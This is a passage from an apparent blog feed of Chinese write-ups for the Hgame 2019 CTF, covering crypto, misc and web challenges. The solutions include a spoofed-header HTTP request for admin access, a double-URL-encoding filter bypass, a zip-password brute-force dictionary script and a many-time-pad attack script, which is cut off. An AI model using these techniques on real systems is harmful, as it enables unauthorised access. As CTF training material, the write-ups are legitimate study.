href="https://zh.wikipedia.org/wiki/%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81">https://zh.wikipedia.org/wiki/%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81</a></p><p>曼彻斯特编码有两种形式，可以都试一下，本题为<code>01-&gt;1,10-&gt;0</code>给出解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;曼彻斯特解码\n&quot;</span> </span><br><span class="line"><span class="comment">#01对应1  10对应0 </span></span><br><span class="line">r=<span class="string">&#x27;&#x27;</span> </span><br><span class="line">s=<span class="string">&#xx27;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s)/<span class="number">2</span>): </span><br><span class="line">    c=s[i* <span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>] </span><br><span class="line">    <span class="keyword">if</span> c==<span class="string">&#x27;01&#x27;</span>:  </span><br><span class="line">        r+= <span class="string">&#x27;1&#x27;</span> </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        r+= <span class="string">&#x27;0&#x27;</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;r--&gt;&#x27;</span> + r + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">print(hex(int(r, <span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&quot;hex&quot;</span>))</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;3f24e567591e9cbab2a7d2f1f748a1d4&#125;</span><br></pre></td></tr></table></figure><h2 id="hill"><a href="#hill" class="headerlink" title="hill"></a>hill</h2><blockquote><p>Description<br>hill密码，秘钥是3x3矩阵，flag的密文是TCSHXZTCXAPBDKJVJDOHJEAE，flag中含有BABYSHILL，flag是有意义的英文，最终提交格式: hgame{有意义的英文} hint1: <a href="https://en.wikipedia.org/wiki/Hill_cipher">https://en.wikipedia.org/wiki/Hill_cipher</a> hint2: 模逆元</p></blockquote><p>hill密码，已知明文攻击。贴一下官方WP吧</p><p>相关链接: </p><ul><li><p><a href="https://en.wikipedia.org/wiki/Hill_cipher">https://en.wikipedia.org/wiki/Hill_cipher</a></p></li><li><p><a href="http://www.practicalcryptography.com/ciphers/hill-cipher/">http://www.practicalcryptography.com/ciphers/hill-cipher/</a> </p></li><li><p><a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/">http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/</a></p></li></ul><p><img src="https://i.loli.net/2019/02/23/5c70c40a72033.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line">alphabet = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert2matrix</span>(<span class="params">m, dimension</span>):</span></span><br><span class="line"><span class="keyword">for</span> index, i <span class="keyword">in</span> enumerate(m):</span><br><span class="line">values = []</span><br><span class="line"><span class="keyword">if</span> index % dimension == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, dimension):</span><br><span class="line">values.append([alphabet.index(m[index + j])])</span><br><span class="line"><span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">m_mat = np.matrix(values)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">m_mat = np.hstack((m_mat, values))</span><br><span class="line"><span class="keyword">return</span> m_mat</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">m = <span class="string">&#x27;BABYSHILL&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;HXZTCXAPB&#x27;</span></span><br><span class="line">dimension = <span class="number">3</span></span><br><span class="line">unknown_c = <span class="string">&#x27;TCSHXZTCXAPBDKJVJDOHJEAE&#x27;</span></span><br><span class="line">c = convert2matrix(c, dimension)</span><br><span class="line">c = Matrix(c)</span><br><span class="line">c_inv = c.inv_mod(<span class="number">26</span>) <span class="comment"># 模逆矩阵，直接调库了，不调库自己实现或者通过numpy的逆矩阵稍加修改可以</span></span><br><span class="line">c_inv = c_inv.tolist()</span><br><span class="line"></span><br><span class="line">m = convert2matrix(m, dimension)</span><br><span class="line">m = np.matrix(m)</span><br><span class="line">dec_key = m*c_inv</span><br><span class="line">dec_key %= <span class="number">26</span></span><br><span class="line">print(dec_key)</span><br><span class="line">m1 = crypt.hill_crypt(unknown_c,dec_key,dimension) <span class="comment">#这是自己实现的简单的hill加密函数，也可用在线网站加密</span></span><br><span class="line">print(m1)</span><br></pre></td></tr></table></figure><h2 id="Vigener"><a href="#Vigener" class="headerlink" title="Vigener~"></a>Vigener~</h2><blockquote><p>Description<br>普通的Vigener<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/orz/ciphertext.txt">http://plir4axuz.bkt.clouddn.com/hgame2019/orz/ciphertext.txt</a></p></blockquote><p><a href="https://www.guballa.de/vigenere-solver">维吉尼亚密码解密神站</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Zbi Namyrwjk wmhzk cw s eknlgv uz ifuxstlata edhnufwlow xwpz vc mkohk s kklmwk uz mflklagnkh Gswyuv uavbijk, huwwv uh xzw ryxlwxm sx s qycogxx. Ml ay u jgjs ij hgrsedhnufwlow wmtynmlmzcsf. Lny gahnyv ak kuwq lu orvwxmxsfj urv asjpwekhx, tmz cx jwycwlwj upd szniehzm xg txyec az zsj lnliw ukhxmjoyw, ozowl wsxhiv az nlw vkmgjavnmgf ry gzalzvw atxiuzozjjshfi. Ests twgvfi zsby xjakx xg asjpwekhx wfilchloir kunyqwk zbel sxy ikkkhxasrfc Namyrwjk wmhzklw. Af kckzlkyr kadnc lzxyi, Xjoyhjaib Oskomoa ogm xzw lcvkl zi tmtrcwz s myrwjgf qwlnih gx jygahnyvafm Pmywtyvw uojlwjy. Nlw Noaifwxy gahnyv osy ivayohedde xikuxcfwv hs Kagbur Tsznmklg Viddgms af ncw gfk nlgmyurv xopi zmtxvwv ghh xalnc-gfk vsgc Ru gaxxu hwd. Yck. Yaupef Tgnxakzu Fwdruwg, tan xzw ywlwek qek dgnij eomellxcfmlkx xg Trumkw jy Zaykhijw oh xzw tcrwln wiflalc sfj ms suwomjwj cxk hxywwfz heew. lfey ay ajqmenycpglmqqjzndhrqwpvhtaniz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key: guess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The Vigenere ciphe is a method of encrypting alphabetic text by using a series of interwoven Caesar ciphers, based on the letters of a keyword. It is a form of polyalphabetic substitution. The cipher is easy to understand and implement, but it resisted all attempts to break it for three centuries, which earned it the description le chiffre indechiffrable. Many people have tried to implement encryption schemes that are essentially Vigenere ciphers. In eighteen sixty three, Friedrich Kasiski was the first to publish a general method of deciphering Vigenere ciphers. The Vigenere cipher was originally described by Giovan Battista Bellaso in his one thousand five hundred and fifty-one book La cifra del. Sig. Giovan Battista Bellaso, but the scheme was later misattributed to Blaise de Vigenere in the nineth century and so acquired its present name. flag is gfyuytukxariyydfjlplwsxdbzwvqt</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Are-You-Familiar-with-DNS-Records"><a href="#Are-You-Familiar-with-DNS-Records" class="headerlink" title="Are You Familiar with DNS Records?"></a>Are You Familiar with DNS Records?</h2><blockquote><p>Description<br>well, you know, this is a song-fen-ti, have fun! XD<br>然并卵的hint: DNS 有很多种不一样的记录类型，其中一种类型如果没有正确设置就可能被其他邮件服务器拒收，flag 就在此域名的第二条此类型记录里<br>URL <a href="http://project-a11.club/">http://project-a11.club/</a></p></blockquote><p><a href="https://tool.lu/dns/index.html">https://tool.lu/dns/index.html</a>      TXT类型记录</p><p><img src="https://i.loli.net/2019/02/23/5c70c0976f969.png"></p><h2 id="快到火炉旁找个位置坐坐！"><a href="#快到火炉旁找个位置坐坐！" class="headerlink" title="快到火炉旁找个位置坐坐！"></a>快到火炉旁找个位置坐坐！</h2><blockquote><p>Description<br>1.从炉石传说导出的套牌为啥不能用了=。= ,还原它 2.flag为hgame{修复后的代码} 套牌代码： hint:出题人首先对数量做了些事情=。= AAECAf0EBu0FuAju9gLQwQIMigGcAq4DyQOrBMsE5gSYxALaxQKW5AK0/ALSiQOmmAMA<br>URL <a href="http://example.com/">http://example.com/</a></p></blockquote><p>参考链接  <a href="https://zhangshuqiao.org/2018-12/%E7%82%89%E7%9F%B3%E5%8D%A1%E7%BB%84%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/">https://zhangshuqiao.org/2018-12/%E7%82%89%E7%9F%B3%E5%8D%A1%E7%BB%84%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/</a></p><h2 id="找得到我嘛？小火汁"><a href="#找得到我嘛？小火汁" class="headerlink" title="找得到我嘛？小火汁"></a>找得到我嘛？小火汁</h2><blockquote><p>Description<br>ε=ε=ε=ε=ε=ε=┌(;￣◇￣)┘<br>hint: Https<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/orz/safe.pcapng">http://plir4axuz.bkt.clouddn.com/hgame2019/orz/safe.pcapng</a></p></blockquote><p>FTP中找到一个压缩包，拉出来解压后发现是一个<code>secret.log</code></p><p><img src="https://i.loli.net/2019/02/23/5c70e36896b4e.png"></p><p>带到流量包中，解密<code>https流量</code>：编辑——首选项——Protocols——SSL，加载得到的log。然后导出http对象，发现多出一个<code>1.tar</code>。</p><p><img src="https://i.loli.net/2019/02/23/5c70e43e6dcf1.png"></p><p>解压得到<code>flag.jpg</code>，winhex打开或者exiftool打开都可以看到flag。</p><p><img src="https://i.loli.net/2019/02/23/5c70e1aa3b922.png"></p><h2 id="初识二维码"><a href="#初识二维码" class="headerlink" title="初识二维码"></a>初识二维码</h2><blockquote><p>Description<br>你知道吗，二维码就算有缺损也能扫出来哦<br>hint:1.DataURI 2.QRcode基本结构<br>URL <a href="http://plqfgjy5a.bkt.clouddn.com/%E5%88%9D%E8%AF%86%E4%BA%8C%E7%BB%B4%E7%A0%81.zip">http://plqfgjy5a.bkt.clouddn.com/%E5%88%9D%E8%AF%86%E4%BA%8C%E7%BB%B4%E7%A0%81.zip</a></p></blockquote><p>URI字符串可以转成图片，得到</p><p><img src="https://i.loli.net/2019/02/23/5c70ed550a8bb.png"></p><p>对比二维码的基本结构，我们可以发现少了定位标志和定时标志：</p><p><img src="https://i.loli.net/2019/02/23/5c70edaead8df.png"></p><p>题目中缺损二维码尺寸是2626，正常二维码的尺寸是<code>((V-1)*4+21)*((V-1)*4+21)</code>（V=版本号），定位符尺寸固定为7*7,在这个网站<a href="https://merricx.github.io/qrazybox/%E4%B8%8A%E5%8F%AF%E4%BB%A5%E8%BD%BB%E6%9D%BE%E4%BF%AE%E5%A4%8D%E4%BF%AE%E5%A4%8D%E5%90%8E%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E4%B8%BA">https://merricx.github.io/qrazybox/上可以轻松修复修复后的二维码为</a></p><p><img src="https://i.loli.net/2019/02/23/5c70ee701f2f3.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Qu1ck_ReSp0nse_cODe&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;easy-php&quot;&gt;&lt;a href=&quot;#easy-php&quot; class=&quot;headerlink&quot; title=&quot;easy_</summary>
      
    
    
    
    <category term="CTF" scheme="v0w.top/categories/CTF/"/>
    
    
    <category term="php" scheme="v0w.top/tags/php/"/>
    
    <category term="爬虫" scheme="v0w.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>杭电Hgame2019-week1-WP</title>
    <link href="v0w.top/2019/02/01/Hgame2019-week1WP/"/>
    <id>v0w.top/2019/02/01/Hgame2019-week1WP/</id>
    <published>2019-01-31T16:00:00.000Z</published>
    <updated>2020-07-18T10:47:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>说来也是有一点感慨的，去年我也是以萌新的身份参加的杭电hgame，我的第一篇博客好像也是那时候写的呢！算是有纪念意义呢，一年来学了一点知识，想再做一遍，看看菜鸡的水平有没有一星半点的成长。我主要做<code>Web+Misc+Crypto</code>，作为REbeginner，RE比较简单的，可以做一做，太菜了==、</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="谁偷了我的flag"><a href="#谁偷了我的flag" class="headerlink" title="谁偷了我的flag"></a>谁偷了我的flag</h2><blockquote><p>描述<br>呜呜呜，Mki一起床发现写好的题目变成这样了，是因为昨天没有好好关机吗T_T<br>URL <a href="http://118.25.111.31:10086/index.html">http://118.25.111.31:10086/index.html</a></p></blockquote><p>算是很清晰的了，vim非正常关机产生swp文件。本题为<code>.index.html.swp</code>，<code>vim -r index.html.swp</code>还原。  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;3eek_diScl0Sure_fRom+wEbsit@&#125;</span><br></pre></td></tr></table></figure><h2 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h2><blockquote><p>描述<br>想要flag嘛<br>URL  <a href="http://120.78.184.111:8080/week1/how/index.php">http://120.78.184.111:8080/week1/how/index.php</a></p></blockquote><ol><li>POST</li><li>X-Forwarded-For</li><li>User-Agent</li><li>Referer</li><li>Cookie:admin=1</li></ol><p>payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;week1&#x2F;how&#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 120.78.184.111:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko&#x2F;20100101 Waterfox&#x2F;50.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Referer: www.bilibili.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 9</span><br><span class="line">Cookie: admin&#x3D;1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line"></span><br><span class="line">want&#x3D;flag</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;hTTp_HeaDeR_iS_Ez&#125;</span><br></pre></td></tr></table></figure><h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2><blockquote><p>描述<br>代码审计初♂体验<br>URL   <a href="http://120.78.184.111:8080/week1/very_ez/index.php">http://120.78.184.111:8080/week1/very_ez/index.php</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">&quot;vidar&quot;</span>,$_GET[<span class="string">&#x27;id&#x27;</span>])!==<span class="literal">FALSE</span>)</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;干巴爹&lt;/p&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&quot;vidar&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>easy，发送数据会自动进行一次urldecode，故payload需要两次urlencode。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;%%37%36%69dar</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;urlDecode_Is_GoOd&#125;</span><br></pre></td></tr></table></figure><h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><blockquote><p>描述<br>为什么不问问神奇的十二姑娘和她的小伙伴呢<br>URL <a href="http://47.107.252.171:8080/">http://47.107.252.171:8080/</a></p></blockquote><p>看源码，得<code>&lt;a href=&quot;f12.php&quot;&gt;&lt;/a&gt;</code>跟进</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">but can you find the password?</span><br><span class="line">please post password to me! I will open the gate for you!</span><br></pre></td></tr></table></figure><p>发现要密码，在响应头中发现密码：<code>password=woyaoflag</code></p><p>提交得到超链接，但是有302跳转，可以使用burp，得到flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;f12_1s_aMazIng111&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Hidden-Image-in-LSB"><a href="#Hidden-Image-in-LSB" class="headerlink" title="Hidden Image in LSB"></a>Hidden Image in LSB</h2><blockquote><p>描述<br>Here are some magic codes which can hide information in an ordinary picture, can you extract the hidden image in the provided picture?<br>其实本来想让大家写写代码，后来干脆就送分了<br>有个神器叫 stegsolve，利用它可以直接提取本题 flag<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/lsb.zip">http://plir4axuz.bkt.clouddn.com/hgame2019/lsb.zip</a></p></blockquote><p>LSB</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;LSB_is_easy_for_u&#125;</span><br></pre></td></tr></table></figure><h2 id="打字机"><a href="#打字机" class="headerlink" title="打字机"></a>打字机</h2><blockquote><p>描述<br>Aris(划掉)牌打字机，时尚时尚最时尚~<br>hint:谷歌有个以图搜图功能很不错，百度识图好垃圾的。。。<br>URL <a href="http://plps4kyke.bkt.clouddn.com/%E6%89%93%E5%AD%97%E6%9C%BA.zip">http://plps4kyke.bkt.clouddn.com/打字机.zip</a></p></blockquote><p>看着眼熟，google一下确实是京紫的打字机，找到对应的英文字母<br><a href="https://www.bilibili.com/read/cv194341/">https://www.bilibili.com/read/cv194341/</a><br><a href="https://www.bilibili.com/read/cv154778/">https://www.bilibili.com/read/cv154778/</a></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/google%E7%BB%93%E6%9E%9C.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;My_vi0let_tyPewRiter&#125;</span><br></pre></td></tr></table></figure><p>中间的<code>0</code>有点坑，没啥意思。</p><h2 id="Broken-Chest"><a href="#Broken-Chest" class="headerlink" title="Broken Chest"></a>Broken Chest</h2><blockquote><p>描述<br>这个箱子坏掉了！快用你无敌的[疯狂钻石]想想办法啊！<br>更新一波学习资料<a href="https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip/">https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip/</a><br>URL<br><a href="http://plqfgjy5a.bkt.clouddn.com/Broken-Chest.zip">http://plqfgjy5a.bkt.clouddn.com/Broken-Chest.zip</a></p></blockquote><p>压缩包坏了，秉着应该不会难的想法，winhex打开，发现第一个字节有问题，修改完后打开，发现需要密码，看到注释，得到密码<code>S0mETh1ng_U5efuL</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Cra2y_D1aM0nd&#125;</span><br></pre></td></tr></table></figure><h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><blockquote><p>描述<br>无字天书<br>URL <a href="http://plqfgjy5a.bkt.clouddn.com/try-it.pcapng">http://plqfgjy5a.bkt.clouddn.com/try-it.pcapng</a></p></blockquote><p>数据包分析，追踪一个有压缩包的流，得到压缩包的数据。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-01-29_00001.png"></p><p>得到一个压缩包，发现里面有一个password.txt提示我们密码是<code>hgame********</code>说明有八位不确定==、爆破，先按照全数字爆破。</p><p>写了一个字典，脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools <span class="keyword">as</span> its</span><br><span class="line">words = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">r = its.product(words,repeat=<span class="number">8</span>)</span><br><span class="line">f = open(<span class="string">&quot;dic.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">f.write(<span class="string">&#x27;hgame&#x27;</span>)</span><br><span class="line">f.write(<span class="string">&quot;&quot;</span>.join(i))</span><br><span class="line">f.write(<span class="string">&quot;&quot;</span>.join(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑字典得到压缩密码</p><p><img src="https://i.loli.net/2019/01/30/5c515d53bedcd.png"></p><p>解压得到一个1.jpg</p><p>winhex发现有一个zip在文件末尾，提取出来，伪加密，解压得到一个1.doc。打开发现没东西，显示隐藏文字后出现flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;59d28413e36019861498e823f3f41406&#125;</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Mix"><a href="#Mix" class="headerlink" title="Mix"></a>Mix</h2><blockquote><p>描述<br>–…/….-/….-/-…/–…/…–/…../..-./-…./-../-…./..-./–…/—-./….-/….-/–…/.—-/-…./-…/–…/-…/-…./..—/…../.—-/-…./-…./…–/….-/…–/—–/-…./…../–…/-.. So easy</p></blockquote><p>莫斯+hex+凯撒+栅栏</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;E4sY_cRypt0&#125;</span><br></pre></td></tr></table></figure><h2 id="perfect-secrecy"><a href="#perfect-secrecy" class="headerlink" title="perfect_secrecy!"></a>perfect_secrecy!</h2><blockquote><p>描述<br>Mom told me OTP is perfect secrecy!（结果加上hgame{}）<br>URL <a href="http://plqbnxx54.bkt.clouddn.com/easy_otp.py">http://plqbnxx54.bkt.clouddn.com/easy_otp.py</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(hex(x ^ y)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strunhex</span>(<span class="params">s</span>):</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(binascii.a2b_hex(s))</span><br><span class="line"></span><br><span class="line">fp = open(<span class="string">&#x27;poem.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;*********************************&quot;</span></span><br><span class="line">strings = fp.readlines()</span><br><span class="line">strs = [strxor(i[:<span class="number">-3</span>], binascii.unhexlify(key)) <span class="keyword">for</span> i <span class="keyword">in</span> strings]</span><br><span class="line">result = strxor(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>), binascii.unhexlify(key))</span><br><span class="line">print(strs)</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">[&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;,</span></span><br><span class="line"><span class="string">&#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;,</span></span><br><span class="line"><span class="string">&#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;,</span></span><br><span class="line"><span class="string">&#x27;e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c&#x27;,</span></span><br><span class="line"><span class="string">&#x27;d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840&#x27;,</span></span><br><span class="line"><span class="string">&#x27;c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c&#x27;]</span></span><br><span class="line"><span class="string">&#x27;c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>题目意图很明显，<strong>一次安全的密钥，但是多次使用还安全吗</strong></p><p>很显然，答案是否定的，多次使用一个密钥进行加密尤其是异或时，很容易出现安全问题。</p><p>参考这两篇文章<a href="https://www.anquanke.com/post/id/161171">小记一类ctf密码题解题思路</a>，<a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/">http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/</a></p><p>一般的解法有两种，<strong>一是通过字母出现的频率统计规律进行权重赋值。其实说白了就是字频攻击。</strong></p><p><strong>二是合理利用明文的空格</strong></p><blockquote><p>这种方法其实是利用了一个异或的规律和一个小技巧。空格和所有小写字母异或结果是相应的大写字母，空格和所有大写字母异或是相应的小写字母</p></blockquote><p>我是用国外那位大佬的脚本跑的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class="line"><span class="comment"># @author intrd - http://dann.com.br/ </span></span><br><span class="line"><span class="comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class="line">c1 = <span class="string">&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;</span></span><br><span class="line">c2 = <span 